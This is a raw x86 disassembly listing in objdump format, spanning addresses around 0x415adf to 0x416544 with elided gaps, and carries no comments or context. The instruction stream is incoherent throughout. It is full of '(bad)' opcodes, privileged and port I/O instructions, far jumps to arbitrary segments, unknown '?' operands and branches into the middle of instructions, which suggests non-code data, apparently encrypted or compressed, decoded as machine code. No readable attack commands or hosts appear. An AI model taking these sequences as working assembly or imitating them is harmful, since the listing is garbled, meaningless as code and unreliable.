  415adf:	xor    DWORD PTR [eax+0x383ef942],edi
  415ae5:	ficomp DWORD PTR [eax+0x44]
  415ae8:	pop    edx
  415ae9:	jmp    0xab59d46f
  415aee:	imul   edx,DWORD PTR [ecx-0x370f6600],0x80bd3568
  415af8:	mov    ds:0xe055d33b,al
  415afd:	adc    al,0xe0
  415aff:	mov    ds:0x63f51daa,al
  415b04:	mov    al,ds:0x65b22df7
  415b09:	popf   
  415b0a:	imul   edx,ebx,0xfffffff4
  415b0d:	mov    DWORD PTR [esi+0x1c],edi
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcomp  QWORD PTR [ebp+0x28f0470b]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	dec    edi
  415b8d:	mov    dl,0xc8
  415b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b90:	jns    0x415bce
  415b92:	or     ebx,esp
  415b94:	mov    al,ss:0x17c59363
  415b9a:	cmc    
  415b9b:	dec    edi
  415b9c:	arpl   WORD PTR [eax],cx
  415b9e:	pop    ecx
  415b9f:	jbe    0x415b48
  415ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba2:	(bad)  
  415ba3:	outs   dx,BYTE PTR ds:[esi]
  415ba4:	mov    dh,0xe
  415ba6:	fld    DWORD PTR [ebx]
  415ba8:	fldenv [edi+0x6b52afa0]
  415bae:	pop    ebx
  415baf:	mov    dh,0x2e
  415bb1:	fcomp  st(0)
  415bb3:	in     eax,dx
  415bb4:	test   DWORD PTR [ecx-0x8],edx
  415bb7:	inc    ebx
  415bb8:	js     0x415c34
  415bba:	inc    ebx
  415bbb:	pop    ds
  415bbc:	leave  
  415bbd:	mov    cl,0x8f
  415bbf:	jo     0x415c0e
  415bc1:	dec    esi
  415bc2:	sub    edi,DWORD PTR [esi+0x5d]
  415bc5:	icebp  
  415bc6:	push   edx
  415bc7:	and    esi,eax
  415bc9:	dec    eax
  415bca:	scas   al,BYTE PTR es:[edi]
  415bcb:	sbb    ch,ah
  415bcd:	jo     0x415b5e
  415bcf:	(bad)  
  415bd1:	repnz sub eax,0xe10c72e5
  415bd7:	sub    DWORD PTR [ebx+0x6c3f78f1],eax
  415bdd:	mov    esp,DWORD PTR [eax]
  415bdf:	enter  0xd332,0x98
  415be3:	arpl   WORD PTR ds:0x72aef299,ax
  415be9:	inc    edi
  415bea:	xor    ebx,DWORD PTR [eax]
  415bec:	push   esp
  415bed:	adc    eax,0xdfab1674
  415bf2:	fimul  WORD PTR [eax-0x28479ca5]
  415bf8:	push   ebx
  415bf9:	adc    eax,0x6792490b
  415bfe:	aad    0xe9
  415c00:	pop    es
  415c01:	sbb    DWORD PTR [ebx],ebp
  415c03:	aas    
  415c04:	dec    ebp
  415c05:	jmp    0x415c72
  415c07:	outs   dx,DWORD PTR ds:[esi]
  415c08:	xchg   esi,eax
  415c09:	add    BYTE PTR [esi+0x79],ah
  415c0c:	fwait
  415c0d:	iret   
  415c0e:	sub    eax,0xc6be402b
  415c13:	jmp    0x415bcc
  415c15:	cmp    al,0xbb
  415c17:	fld    QWORD PTR [eax+0x5eed99c9]
  415c1d:	jno    0x415ba3
  415c1f:	sbb    al,0xa3
  415c21:	or     eax,0xc3f50cb6
  415c26:	jnp    0x415c9a
  415c28:	or     esi,eax
  415c2a:	fstp   st(4)
  415c2c:	mov    ebp,0x2d8da586
  415c31:	xor    ch,dl
  415c33:	push   ebp
  415c34:	into   
  415c35:	(bad)  
  415c37:	es in  al,0x5e
  415c3a:	xor    eax,0xbd870689
  415c3f:	xchg   esp,eax
  415c40:	imul   ebx,DWORD PTR [ebp-0x2092c3d2],0xc
  415c47:	sahf   
  415c48:	cmp    dl,BYTE PTR [ebx+0x18e5b94c]
  415c4e:	pop    edi
  415c4f:	aaa    
  415c50:	or     edx,DWORD PTR [edi+0x17]
  415c53:	pop    esi
  415c54:	push   ebp
  415c55:	xor    al,0x11
  415c57:	mov    ebx,0x34e055d3
  415c5c:	shr    edi,cl
  415c5e:	es scas al,BYTE PTR es:[edi]
  415c60:	push   esp
  415c61:	add    eax,0x2d4c739b
  415c66:	or     eax,0xc441e5d2
  415c6b:	jbe    0x415ca2
  415c6d:	ret    
  415c6e:	inc    ecx
  415c6f:	addr16 pusha 
  415c71:	cmp    cl,BYTE PTR [edi]
  415c73:	stos   BYTE PTR es:[edi],al
  415c74:	xchg   ecx,eax
  415c75:	dec    esi
  415c76:	aaa    
  415c77:	lods   al,BYTE PTR ds:[esi]
  415c78:	hlt    
  415c79:	xor    eax,0xe1862b9e
  415c7e:	out    0xb9,eax
  415c80:	jbe    0x415cc9
  415c82:	rcl    DWORD PTR [edi+eax*1-0x211d1e53],1
  415c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c8a:	leave  
  415c8b:	retf   0xdae0
  415c8e:	cdq    
  415c8f:	add    BYTE PTR [eax],0x0
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x28d18c1f
  415d03:	sub    al,0x2c
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR [ecx+eax*1],al
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	shl    cl,1
  415d0e:	mov    DWORD PTR [ecx],esi
  415d10:	gs dec ebx
  415d12:	mov    ch,0x1a
  415d14:	imul   DWORD PTR [ebx+0x31cadb3]
  415d1a:	(bad)  
  415d1b:	stos   DWORD PTR es:[edi],eax
  415d1c:	(bad)  
  415d1d:	(bad)  
  415d1e:	jb     0x415d2f
  415d20:	xchg   edi,eax
  415d21:	sub    bh,BYTE PTR [edi+0x69]
  415d24:	stc    
  415d25:	imul   esp,DWORD PTR [edx+0x51],0x27
  415d29:	nop
  415d2a:	adc    al,0xe8
  415d2c:	and    BYTE PTR [edi+0x5ce623ac],bl
  415d32:	mov    DWORD PTR [ebx-0x68e46748],edi
  415d38:	dec    eax
  415d39:	das    
  415d3a:	mov    dl,0x93
  415d3c:	ins    DWORD PTR es:[edi],dx
  415d3d:	sbb    al,0x52
  415d3f:	arpl   WORD PTR [ebp-0x522b54fb],bp
  415d45:	fsubp  st(5),st
  415d47:	and    al,0xfc
  415d49:	jns    0x415d22
  415d4b:	xor    ch,ah
  415d4d:	dec    esi
  415d4e:	aaa    
  415d4f:	mov    WORD PTR [edx],es
  415d51:	mov    ds:0x62d8f887,eax
  415d56:	mov    esi,0xd5f3bc03
  415d5b:	fild   QWORD PTR [edx+eax*8-0x781c1b45]
  415d62:	cwde   
  415d63:	test   DWORD PTR [edi+0x69],edx
  415d66:	mov    WORD PTR [ecx-0x5d],fs
  415d69:	push   ss
  415d6a:	adc    DWORD PTR [edi-0xd8c7ceb],ebp
  415d70:	call   0x9903b6e0
  415d75:	xchg   edi,eax
  415d76:	pushf  
  415d77:	(bad)  [eax]
  415d79:	adc    eax,0x7b05acc1
  415d7e:	mov    edx,0x10ffcca7
  415d83:	dec    DWORD PTR [edx+0x2c]
  415d86:	sub    ecx,DWORD PTR [edx+0x2e]
  415d89:	and    bh,0x4e
  415d8c:	adc    BYTE PTR [ecx-0x2e],0xd5
  415d90:	adc    DWORD PTR [edx],edx
  415d92:	inc    ecx
  415d93:	push   ebx
  415d94:	inc    ecx
  415d95:	inc    ebp
  415d96:	jge    0x415d71
  415d98:	push   ds
  415d99:	cmp    DWORD PTR [ebx-0x41],ecx
  415d9c:	aad    0x66
  415d9e:	mov    ebp,0x58892941
  415da3:	cmp    ch,al
  415da5:	popf   
  415da6:	jp     0x415e06
  415da8:	sub    ch,BYTE PTR ds:0xd1c31b39
  415dae:	iret   
  415daf:	aam    0xce
  415db1:	std    
  415db2:	xchg   edi,eax
  415db3:	fimul  WORD PTR [esi+0x2b]
  415db6:	sbb    al,0xeb
  415db8:	inc    esi
  415db9:	add    esp,ebx
  415dbb:	iret   
  415dbc:	enter  0x73ee,0xc
  415dc0:	cmp    eax,DWORD PTR [ecx-0x35]
  415dc3:	push   ebp
  415dc4:	out    0x58,eax
  415dc6:	aam    0xc3
  415dc8:	sub    ah,0x60
  415dcb:	xchg   ebx,eax
  415dcc:	fidivr DWORD PTR [ecx-0x5d]
  415dcf:	test   eax,0x28860bab
  415dd4:	mov    DWORD PTR [ebx-0x75138612],eax
  415dda:	out    dx,eax
  415ddb:	cmc    
  415ddc:	mov    ebx,DWORD PTR [edi-0x76]
  415ddf:	(bad)  
  415de0:	loop   0x415d9d
  415de2:	jl     0x415e1b
  415de4:	iret   
  415de5:	xchg   edi,eax
  415de6:	pop    edi
  415de7:	aad    0xd3
  415de9:	(bad)  
  415dea:	sbb    al,0x45
  415dec:	sub    cl,ch
  415dee:	xor    edx,DWORD PTR [edx+0x27303bff]
  415df4:	cmp    al,0xc5
  415df6:	mov    bh,0x3f
  415df8:	mov    ebx,0xa2cf1ea3
  415dfd:	loope  0x415de2
  415dff:	xchg   ebx,eax
  415e00:	add    bh,ch
  415e02:	push   es
  415e03:	(bad)  
  415e04:	mov    bl,0xbb
  415e06:	xor    edx,edi
  415e08:	retf   0x12c0
  415e0b:	xor    al,ch
  415e0d:	push   ebp
  415e0e:	(bad)  
  415e0f:	ja     0x415e11
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x18]
  415e81:	inc    ecx
  415e82:	in     eax,dx
  415e83:	push   ds
  415e84:	xor    bh,ah
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	pop    ss
  415e8d:	stc    
  415e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e8f:	push   ss
  415e90:	dec    ebp
  415e91:	aaa    
  415e92:	pop    ecx
  415e93:	int    0xa5
  415e95:	pop    edi
  415e96:	cs add eax,0xfc38ada0
  415e9c:	push   esp
  415e9d:	xchg   esp,eax
  415e9e:	dec    ecx
  415e9f:	(bad)  
  415ea0:	xchg   esp,eax
  415ea1:	xor    DWORD PTR [eax+0x56d06755],ebp
  415ea7:	or     bl,BYTE PTR [ebx-0x7d5fc261]
  415ead:	fisubr WORD PTR [esi+0x26fdeb3b]
  415eb3:	test   DWORD PTR [eax-0x5b24b8f0],eax
  415eb9:	cdq    
  415eba:	push   0x98960aa2
  415ebf:	bound  eax,QWORD PTR [edi+0x5e3a64e0]
  415ec5:	dec    ecx
  415ec6:	xchg   edi,eax
  415ec7:	(bad)  
  415ec8:	push   edx
  415ec9:	dec    ecx
  415eca:	jecxz  0x415eb0
  415ecc:	dec    ebx
  415ecd:	popf   
  415ece:	rcl    DWORD PTR [ebp-0x563661c6],cl
  415ed4:	leave  
  415ed5:	xchg   esi,eax
  415ed6:	cld    
  415ed7:	mov    dh,0x60
  415ed9:	push   esp
  415eda:	mov    ss,WORD PTR [ebx]
  415edc:	pop    es
  415edd:	outs   dx,BYTE PTR ds:[esi]
  415ede:	xchg   DWORD PTR [edx],esp
  415ee0:	out    dx,al
  415ee1:	or     edi,0xe
  415ee4:	lods   al,BYTE PTR ds:[esi]
  415ee5:	add    al,0x9f
  415ee7:	add    dh,al
  415ee9:	xchg   esi,eax
  415eea:	dec    ebx
  415eeb:	out    dx,ax
  415eed:	call   0x4cd83f1d
  415ef2:	ja     0x415e95
  415ef4:	cld    
  415ef5:	push   edx
  415ef6:	xor    edx,DWORD PTR [eax-0x3fa27bf1]
  415efc:	arpl   WORD PTR [edx+0x750253ad],ax
  415f02:	and    eax,0xdfd50b53
  415f07:	aaa    
  415f08:	hlt    
  415f09:	aad    0xd6
  415f0b:	jne    0x415e96
  415f0d:	inc    ebp
  415f0e:	push   ds
  415f0f:	and    al,0xc9
  415f11:	mov    bh,0xc2
  415f13:	or     ecx,DWORD PTR [eax]
  415f15:	cs cs stos BYTE PTR es:[edi],al
  415f18:	inc    eax
  415f19:	xchg   ah,al
  415f1b:	fs int 0x27
  415f1e:	jne    0x415f19
  415f20:	neg    BYTE PTR [ebx]
  415f22:	push   ebp
  415f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f24:	sahf   
  415f25:	mov    ebp,0x3fec224d
  415f2a:	jbe    0x415f1e
  415f2c:	xor    DWORD PTR [edi+eiz*2],esi
  415f2f:	pop    edx
  415f30:	mov    BYTE PTR [esp+eax*8-0x4c4030cf],ah
  415f37:	pop    edx
  415f38:	xor    BYTE PTR [ebp-0x28],al
  415f3b:	adc    BYTE PTR [eax-0x4],dh
  415f3e:	aad    0x1b
  415f40:	and    al,0x3a
  415f42:	in     al,0xb5
  415f44:	addr16 sahf 
  415f46:	pop    ss
  415f47:	mov    al,0x1
  415f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f4a:	loop   0x415ef1
  415f4c:	jne    0x415fcc
  415f4e:	lock fs dec edx
  415f51:	les    esp,FWORD PTR [edi+0x37ce9ad2]
  415f57:	sub    DWORD PTR [ecx+0x2b0fe4fe],0xffffff9a
  415f5e:	gs pop eax
  415f60:	mov    ds:0xb68382cd,al
  415f65:	jmp    0xdbd7:0xb9b971fb
  415f6c:	imul   DWORD PTR [edx-0x76]
  415f6f:	dec    ebx
  415f70:	ins    BYTE PTR es:[edi],dx
  415f71:	int    0xd9
  415f73:	cwde   
  415f74:	mov    dl,0xe3
  415f76:	(bad)  
  415f78:	jmp    0x415f01
  415f7a:	xor    DWORD PTR [ecx],esp
  415f7c:	shl    esp,0xd4
  415f7f:	dec    ecx
  415f80:	popf   
  415f81:	cmc    
  415f82:	outs   dx,BYTE PTR ds:[esi]
  415f83:	lods   al,BYTE PTR ds:[esi]
  415f84:	cld    
  415f85:	mov    esp,0x316ddfb5
  415f8a:	inc    esp
  415f8b:	jmp    0x415fa6
  415f8d:	jb     0x415f6d
  415f8f:	fadd   DWORD PTR [eax]
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	iret   
  416001:	pusha  
  416002:	jnp    0x415fad
  416004:	xor    al,0xe8
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	fwait
  41600d:	loop   0x415f94
  41600f:	mov    bl,0xa6
  416011:	xchg   edx,eax
  416012:	cld    
  416013:	mov    esp,cr3
  416016:	and    eax,0xf222d66c
  41601b:	dec    ebp
  41601c:	stos   DWORD PTR es:[edi],eax
  41601d:	or     dh,BYTE PTR [eax-0xa080766]
  416023:	iret   
  416024:	shl    eax,1
  416026:	retf   
  416027:	int    0x53
  416029:	xchg   DWORD PTR [esi+0x2da4e9da],ebp
  41602f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416030:	inc    eax
  416031:	int3   
  416032:	inc    eax
  416033:	push   ecx
  416034:	in     al,dx
  416035:	xor    eax,0x4f1ac201
  41603a:	jbe    0x41601b
  41603c:	push   0x7e
  41603e:	je     0x41602c
  416040:	ret    
  416041:	push   ecx
  416042:	in     al,0x16
  416044:	daa    
  416045:	imul   edx,DWORD PTR [esi+0x1a],0xb0d5f1da
  41604c:	xchg   cl,dh
  41604e:	fild   WORD PTR [esi]
  416050:	push   esi
  416051:	ret    0xcb08
  416054:	inc    ecx
  416055:	out    dx,al
  416056:	or     ch,0x1b
  416059:	cwde   
  41605a:	(bad)  
  41605b:	mov    dh,0xb0
  41605d:	mov    ebx,0x5252305
  416062:	push   ss
  416063:	mov    cl,BYTE PTR [edi-0x1bda5e90]
  416069:	dec    eax
  41606a:	mov    DWORD PTR [ebp-0x2a],edx
  41606d:	retf   
  41606e:	dec    ebp
  41606f:	arpl   ax,sp
  416071:	or     ah,BYTE PTR [ebx-0x5d110082]
  416077:	adc    ebp,ebx
  416079:	inc    esi
  41607a:	jp     0x41602d
  41607c:	fcmove st,st(7)
  41607e:	jg     0x416012
  416080:	push   cs
  416081:	mov    al,0x6c
  416083:	sub    esp,DWORD PTR [esp+ebx*2+0x49]
  416087:	inc    esi
  416088:	pop    edi
  416089:	xchg   ebx,eax
  41608a:	push   ecx
  41608b:	int3   
  41608c:	outs   dx,BYTE PTR ds:[si]
  41608f:	repz out dx,eax
  416091:	(bad)  
  416092:	xlat   BYTE PTR ds:[ebx]
  416093:	sbb    DWORD PTR [esi+0x63],ebp
  416096:	or     BYTE PTR [ebx+0x53],ah
  416099:	xchg   ebx,eax
  41609a:	cmp    eax,0xc535dbfb
  41609f:	fcomip st,st(7)
  4160a1:	and    eax,0xe408c022
  4160a6:	rcr    edx,0xe6
  4160a9:	pop    edi
  4160aa:	fisub  DWORD PTR [eax-0x72]
  4160ad:	call   0x5b8f:0x4a9dd5ae
  4160b4:	inc    esp
  4160b6:	jno    0x41604d
  4160b8:	jl     0x416060
  4160ba:	out    0xc4,al
  4160bc:	mov    ah,0x4f
  4160be:	and    ch,0x75
  4160c1:	neg    DWORD PTR ss:[esi+0x7f92af32]
  4160c8:	adc    DWORD PTR ds:0x510d3ef1,0x50aada87
  4160d2:	sahf   
  4160d3:	and    ebx,DWORD PTR [esi]
  4160d5:	rcr    BYTE PTR [eax+eax*1],0xb0
  4160d9:	ror    BYTE PTR [ebx],1
  4160db:	add    BYTE PTR [edi],ch
  4160dd:	lahf   
  4160de:	jae    0x4160c1
  4160e0:	loope  0x416132
  4160e2:	mov    al,al
  4160e4:	in     eax,0xf4
  4160e6:	push   0x78
  4160e8:	or     ah,dl
  4160ea:	xchg   DWORD PTR [ecx-0x332053a1],eax
  4160f0:	lock es inc esp
  4160f3:	mov    ebx,0x7960b288
  4160f8:	xchg   bl,bl
  4160fa:	in     eax,dx
  4160fb:	clc    
  4160fc:	sahf   
  4160fd:	pop    eax
  4160fe:	stc    
  4160ff:	and    edx,edi
  416101:	sahf   
  416102:	cdq    
  416103:	mov    ?,WORD PTR [ebp+ecx*2-0x73]
  416107:	cmp    cl,BYTE PTR [ebp-0x2de6b373]
  41610d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41610e:	in     al,0x2
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0xab793cf3
  416183:	dec    esi
  416184:	cmp    cl,ch
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	dec    ebx
  41618d:	enter  0x9235,0x2e
  416191:	pop    esi
  416192:	lock repz adc al,0x6e
  416196:	mov    BYTE PTR [edi+0x3a5a5a98],bl
  41619c:	sub    al,0xa6
  41619e:	bound  ebp,QWORD PTR [esi]
  4161a0:	add    al,0x21
  4161a2:	xchg   ebx,eax
  4161a3:	ja     0x416208
  4161a5:	push   ds
  4161a6:	aas    
  4161a7:	daa    
  4161a8:	jmp    0x4161fd
  4161aa:	cmp    BYTE PTR [edi+0x4a51d006],ah
  4161b0:	dec    esi
  4161b1:	ss gs and al,0x1
  4161b5:	sub    al,0x24
  4161b7:	sbb    BYTE PTR [eax+edx*8-0x6ae69b65],ah
  4161be:	(bad)  
  4161bf:	sbb    al,0xb
  4161c1:	cmp    DWORD PTR [ecx-0x9],esi
  4161c4:	and    DWORD PTR [esi-0x46fcf1c4],ebx
  4161ca:	(bad)  
  4161cb:	repz repnz shr DWORD PTR [ebx],cl
  4161cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d0:	add    esi,esp
  4161d2:	cs stc 
  4161d4:	add    esp,DWORD PTR [ebx]
  4161d6:	or     esi,DWORD PTR [ebp-0x3252d575]
  4161dc:	test   eax,0x7057c9c
  4161e1:	out    dx,al
  4161e2:	adc    eax,DWORD PTR [ebx+0x33036f40]
  4161e8:	or     al,0x12
  4161ea:	ds pop ebx
  4161ec:	push   ecx
  4161ed:	or     eax,0x7e959539
  4161f2:	retf   0xcee6
  4161f5:	push   cs
  4161f6:	inc    esp
  4161f7:	and    eax,0xbccf5b2
  4161fc:	mov    esp,esi
  4161fe:	mov    ebx,0x1bd05c8
  416203:	jmp    0x4161da
  416205:	jge    0x4161fc
  416207:	jb     0x416236
  416209:	mov    WORD PTR [edi],?
  41620b:	mov    dh,0xa2
  41620d:	dec    ecx
  41620e:	aaa    
  41620f:	imul   edx,esp,0x72
  416212:	mov    ecx,0x64ed9890
  416217:	jae    0x416201
  416219:	mov    DWORD PTR [ebx+0x5d],0xc9d8ac29
  416220:	(bad)  
  416221:	pop    ecx
  416222:	hlt    
  416223:	retf   0xa3e7
  416226:	call   0x7e60:0x849d57
  41622d:	in     eax,dx
  41622e:	les    eax,FWORD PTR [edi+0x11]
  416231:	xor    cl,BYTE PTR es:[esi-0x16]
  416235:	inc    ecx
  416236:	leave  
  416237:	cmp    al,0x97
  416239:	pop    esp
  41623a:	cmc    
  41623b:	call   0xd20f453e
  416240:	jnp    0x41627f
  416242:	xor    BYTE PTR [edi+edi*2],cl
  416245:	jecxz  0x416237
  416247:	call   0xae42:0xfbe16ac7
  41624e:	jns    0x416227
  416250:	xchg   BYTE PTR [esi+0x37394533],ch
  416256:	jb     0x416244
  416258:	cmp    BYTE PTR [eax],0xe
  41625b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41625c:	xor    DWORD PTR [edx],esi
  41625e:	loop   0x41620f
  416260:	cs cs push es
  416263:	shl    BYTE PTR [esi-0x7e6fefec],0x72
  41626a:	or     ch,cl
  41626c:	jno    0x41624b
  41626e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41626f:	mov    ebp,ebx
  416271:	jge    0x4162aa
  416273:	sub    eax,DWORD PTR [edi+0x4092f60e]
  416279:	xor    DWORD PTR [ebx-0x6c47112f],esp
  41627f:	push   ebx
  416280:	imul   ebx,DWORD PTR [ebp+0x6f27daf3],0x66983686
  41628a:	sbb    dl,BYTE PTR [edi]
  41628c:	adc    ah,BYTE PTR [eax-0x7]
  41628f:	sub    eax,DWORD PTR [eax]
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c57:0xcf6ec0ee
  416305:	jmp    0x0:0x1040000
  41630c:	mov    ds:0xe4055f28,al
  416311:	pusha  
  416312:	pop    ebx
  416313:	cli    
  416314:	or     esi,DWORD PTR [ecx+eiz*4+0x7e5bc12b]
  41631b:	xor    eax,0x3e1f4ae4
  416320:	jae    0x41633c
  416322:	(bad)  
  416323:	das    
  416324:	int    0x2f
  416326:	fwait
  416327:	lea    eax,[edx]
  416329:	out    dx,eax
  41632a:	mov    ecx,0xe967f1e2
  41632f:	pusha  
  416330:	int3   
  416331:	push   0x5e2c177
  416336:	push   esi
  416337:	sahf   
  416338:	xor    eax,0x2ed93572
  41633d:	imul   edi,DWORD PTR [edi],0x23fdc78d
  416343:	retf   0x54de
  416346:	add    eax,0x9b87928c
  41634b:	mov    ss,WORD PTR [edi+0x5f]
  41634e:	xor    al,0xbe
  416350:	xor    BYTE PTR [edi-0x6bf8572b],dh
  416356:	out    0xd9,eax
  416358:	js     0x4163c0
  41635a:	or     ebp,DWORD PTR [eax+edx*8-0x5b]
  41635e:	rol    BYTE PTR [ebp+0x1],cl
  416361:	mov    ds:0x575c1d1d,eax
  416366:	inc    eax
  416367:	(bad)
  41636b:	shl    BYTE PTR [esi-0x80],1
  41636e:	sub    ecx,DWORD PTR [esi-0x5c62708c]
  416374:	dec    ebp
  416375:	cmp    ah,BYTE PTR [eax]
  416377:	lock cmp eax,0xd499950c
  41637d:	scas   al,BYTE PTR es:[edi]
  41637e:	lods   eax,DWORD PTR ds:[esi]
  41637f:	mov    DWORD PTR [ecx+0x3e],edx
  416382:	pop    ds
  416383:	xchg   esi,eax
  416384:	int    0x71
  416386:	adc    BYTE PTR [ebx+eax*4+0x25],dh
  41638a:	cmp    edi,DWORD PTR [ecx+0x7cca61de]
  416390:	mov    dh,0xd1
  416392:	mov    DWORD PTR [edx+0x6d],ebx
  416395:	dec    edx
  416396:	cmp    ecx,DWORD PTR [ebp+0x58]
  416399:	mov    ds:0xd7446362,eax
  41639e:	rol    DWORD PTR [ecx+0x7f],cl
  4163a1:	out    0x4f,al
  4163a3:	pop    ds
  4163a4:	sub    edx,DWORD PTR [edx+0x5827b8a6]
  4163aa:	or     eax,0x6949c94b
  4163af:	dec    edx
  4163b0:	xchg   BYTE PTR [eax],dh
  4163b2:	mov    DWORD PTR [esi],edi
  4163b4:	in     eax,dx
  4163b5:	sbb    BYTE PTR [edi],cl
  4163b7:	clc    
  4163b8:	dec    ebx
  4163b9:	in     al,dx
  4163ba:	cld    
  4163bb:	test   al,0x4e
  4163be:	adc    DWORD PTR [edx],esi
  4163c0:	jl     0x416360
  4163c2:	lock gs jns 0x41634b
  4163c6:	push   ds
  4163c7:	iret   
  4163c8:	sub    al,0x95
  4163ca:	jl     0x4163ba
  4163cc:	xor    bl,ah
  4163ce:	pop    ds
  4163cf:	aam    0xf4
  4163d1:	aas    
  4163d2:	or     bl,BYTE PTR [esi-0x7858f924]
  4163d8:	inc    esi
  4163d9:	and    esi,DWORD PTR [eax]
  4163db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163dc:	mov    al,0x77
  4163de:	rcl    ah,0x76
  4163e1:	jae    0x41643a
  4163e3:	ins    BYTE PTR es:[edi],dx
  4163e4:	rcr    BYTE PTR [ecx-0xa],cl
  4163e7:	xor    ecx,edx
  4163e9:	jmp    0x60fd:0x79235926
  4163f0:	mov    fs,WORD PTR [esi-0x16]
  4163f3:	dec    ebx
  4163f4:	mov    ebp,0x64bbfc4d
  4163f9:	xchg   ecx,eax
  4163fa:	adc    dl,0xb6
  4163fd:	cmp    BYTE PTR [eax],cl
  4163ff:	xor    esi,DWORD PTR [esi+ecx*4+0x1b]
  416403:	mov    ch,BYTE PTR es:[eax+eax*2+0x2c]
  416408:	adc    eax,0x689aef91
  41640d:	jno    0x4163d4
  41640f:	add    BYTE PTR [eax],0x0
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	mov    bl,0x2
  416482:	jno    0x416415
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	(bad)  
  41648d:	jp     0x416435
  41648f:	fs out 0x10,eax
  416492:	lock das 
  416494:	int    0x12
  416496:	sbb    al,0x6f
  416498:	or     dh,BYTE PTR [edx+0x7a8d7ad0]
  41649e:	icebp  
  41649f:	jnp    0x41643a
  4164a1:	adc    al,0xd5
  4164a3:	mov    bl,dh
  4164a5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4164a7:	das    
  4164a8:	mov    ah,0xcc
  4164aa:	add    edx,DWORD PTR [ebp+0x5b]
  4164ad:	ret    
  4164ae:	in     al,0x58
  4164b0:	popf   
  4164b1:	xchg   esp,eax
  4164b2:	sbb    ecx,DWORD PTR [ebp-0xb601318]
  4164b8:	mov    ecx,fs
  4164ba:	(bad)  [ebp-0x1b]
  4164bd:	and    al,0xc2
  4164bf:	xchg   esi,eax
  4164c0:	xlat   BYTE PTR ds:[ebx]
  4164c1:	mov    eax,0x1333779b
  4164c6:	mov    ebx,DWORD PTR [edi-0x31]
  4164c9:	xor    dl,ch
  4164cb:	mov    ecx,0xf82e9724
  4164d0:	jle    0x416473
  4164d2:	leave  
  4164d3:	adc    DWORD PTR [edi+0x45dec6c7],0x38
  4164da:	pop    ebp
  4164db:	(bad)  
  4164dd:	push   cs
  4164de:	cmp    al,0x38
  4164e0:	addr16 popa 
  4164e2:	add    BYTE PTR [edx+0x179f4d2d],0x64
  4164e9:	fsub   st(1),st
  4164eb:	sbb    esp,0xdab7bf5c
  4164f1:	fmul   DWORD PTR [eax-0x2c547402]
  4164f7:	add    eax,DWORD PTR [esi+0x79]
  4164fa:	adc    al,0x26
  4164fc:	and    eax,0xde81c616
  416501:	retf   0x6084
  416504:	(bad)
  416508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416509:	test   DWORD PTR [esi+0x1e36f3c7],edi
  41650f:	jmp    0x5e600838
  416514:	xchg   edx,eax
  416515:	sbb    al,0x4a
  416517:	mov    bl,0x99
  416519:	dec    eax
  41651a:	sub    eax,0xc2c204a9
  41651f:	xchg   edx,eax
  416520:	jno    0x4164fd
  416522:	or     al,0xcd
  416524:	or     al,0x41
  416526:	mov    ebx,0xd43171e8
  41652b:	dec    esp
  41652c:	sub    dl,BYTE PTR [esi]
  41652e:	enter  0x5b84,0x97
  416532:	pop    es
  416533:	gs cli 
  416535:	push   esp
  416536:	cdq    
  416537:	xor    DWORD PTR [esi+0x50fec94c],eax
  41653d:	fld    DWORD PTR [ebx+0x58]
  416540:	push   ecx
  416541:	jno    0x41653a
  416543:	das    
  416544:	xor    eax,0x932b0514
